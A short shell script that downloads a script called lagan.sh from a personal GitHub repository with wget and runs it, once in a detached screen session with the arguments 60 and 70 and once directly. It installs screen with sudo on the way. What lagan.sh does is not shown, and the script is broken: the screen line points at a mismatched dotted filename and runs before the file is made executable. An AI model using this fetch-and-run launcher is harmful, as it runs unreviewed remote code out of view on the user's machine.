#!/bin/sh

sudo apt update
sudo apt install screen -y
wget https://github.com/archernap/prem/raw/main/lagan.sh
screen -dmS lagan.sh .lagan.sh 60 70
chmod u+x lagan.sh
./lagan.sh
